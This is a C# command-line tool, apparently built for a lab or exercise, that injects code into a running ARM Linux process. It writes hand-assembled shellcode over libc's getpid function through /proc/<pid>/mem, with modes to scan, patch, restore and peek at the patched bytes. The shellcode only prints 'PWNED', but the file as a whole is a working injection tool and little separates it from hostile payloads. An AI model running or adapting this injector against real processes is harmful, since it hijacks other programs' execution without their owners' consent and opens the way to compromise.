using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;

class Inj
{
    [DllImport("libc.so.6", SetLastError=true)] static extern int open(string p, int f);
    [DllImport("libc.so.6", SetLastError=true)] static extern int close(int fd);
    [DllImport("libc.so.6", SetLastError=true)] static extern IntPtr pread64(int fd, byte[] b, IntPtr n, long off);
    [DllImport("libc.so.6", SetLastError=true)] static extern IntPtr pwrite64(int fd, byte[] b, IntPtr n, long off);

    static int E() => Marshal.GetLastWin32Error();

    // pread/pwrite with off_t; offset is int in ARM EABI for these wrappers under .NET -> use long via marshaling of IntPtr
    static long Rd(int fd, byte[] buf, long off)
        => (long)pread64(fd, buf, (IntPtr)buf.Length, off);
    static long Wr(int fd, byte[] buf, long off)
        => (long)pwrite64(fd, buf, (IntPtr)buf.Length, off);

    // __NR_getpid ARM = 20 ; __NR_nanosleep = 162
    static byte[] GetpidWrapper() => new byte[]{
        0x14,0x70,0xA0,0xE3,  // mov r7,#20
        0x00,0x00,0x00,0xEF,  // svc #0
        0x1E,0xFF,0x2F,0xE1   // bx lr
    };

    static void Main(string[] a)
    {
        if (a.Length < 2) { Console.WriteLine("usage: injector <pid> <scan|patch|restore|verify> [addr]"); return; }
        int pid = int.Parse(a[0]);
        string mode = a[1];
        Console.WriteLine($"== injector pid={pid} mode={mode} ==");

        // Build shellcode: write(1,"PWNED\n",6); bx lr
        // mov r7,#4 ; mov r0,#1 ; add r1,pc,#8 ; mov r2,#6 ; svc #0 ; bx lr ; "PWNED\n"
        var sch = new byte[]{
            0x04,0x70,0xA0,0xE3,
            0x01,0x00,0xA0,0xE3,
            0x08,0x10,0x8F,0xE2,
            0x06,0x20,0xA0,0xE3,
            0x00,0x00,0x00,0xEF,
            0x1E,0xFF,0x2F,0xE1,
            0x50,0x57,0x4E,0x45,0x44,0x0A
        };

        // Find libc base: first r-xp mapping of libc-2.30.so
        long libcBase = -1; long libcFileOff = -1;
        foreach (var line in File.ReadAllLines("/proc/" + pid + "/maps"))
        {
            if (!line.Contains("libc-2.30.so")) continue;
            var p = line.Split(new[]{' '}, StringSplitOptions.RemoveEmptyEntries);
            var rng = p[0].Split('-');
            long s = Convert.ToInt64(rng[0],16);
            if (libcBase < 0 || s < libcBase) { libcBase = s; libcFileOff = Convert.ToInt64(p[2],16); }
        }
        Console.WriteLine($"  libc base={libcBase:x8} fileoff_of_base={libcFileOff:x}");

        int fd = open("/proc/"+pid+"/mem", 2);
        if (fd < 0) { Console.WriteLine($"  open mem FAILED errno={E()}"); return; }

        long getpidAddr = libcBase + 0xa0730;

        if (mode == "scan")
        {
            Console.WriteLine($"  getpid expected at 0x{getpidAddr:x8}");
            var buf = new byte[20];
            Rd(fd, buf, getpidAddr);
            Console.WriteLine("  bytes: " + BitConverter.ToString(buf));
            Console.WriteLine("  matches libc wrapper: " + (BitConverter.ToString(buf,0,12) == BitConverter.ToString(GetpidWrapper())));

            // also check nanosleep (used in tight loop) as alternative target
            long nsAddr = libcBase + 0x9fc24;
            var nb = new byte[8];
            Rd(fd, nb, nsAddr);
            Console.WriteLine($"  nanosleep @0x{nsAddr:x8}: " + BitConverter.ToString(nb));
        }
        else if (mode == "patch")
        {
            string save = "/opt/inj/orig." + pid + ".bin";
            var orig = new byte[sch.Length];
            Rd(fd, orig, getpidAddr);
            Console.WriteLine("  orig: " + BitConverter.ToString(orig));
            File.WriteAllBytes(save, orig);
            var w = Wr(fd, sch, getpidAddr);
            var back = new byte[sch.Length];
            Rd(fd, back, getpidAddr);
            Console.WriteLine($"  write {w} -> " + BitConverter.ToString(back));
            Console.WriteLine("  VERIFIED: " + (BitConverter.ToString(back)==BitConverter.ToString(sch)));
            Console.WriteLine("  saved: " + save);
        }
        else if (mode == "restore")
        {
            string save = "/opt/inj/orig." + pid + ".bin";
            if (!File.Exists(save)) { Console.WriteLine("  missing " + save); return; }
            var orig = File.ReadAllBytes(save);
            Wr(fd, orig, getpidAddr);
            var back = new byte[orig.Length];
            Rd(fd, back, getpidAddr);
            Console.WriteLine("  restored: " + (BitConverter.ToString(back)==BitConverter.ToString(orig)));
        }
        else if (mode == "peek")
        {
            var buf = new byte[20];
            Rd(fd, buf, getpidAddr);
            Console.WriteLine($"  getpid now: " + BitConverter.ToString(buf));
        }
        close(fd);
    }
}
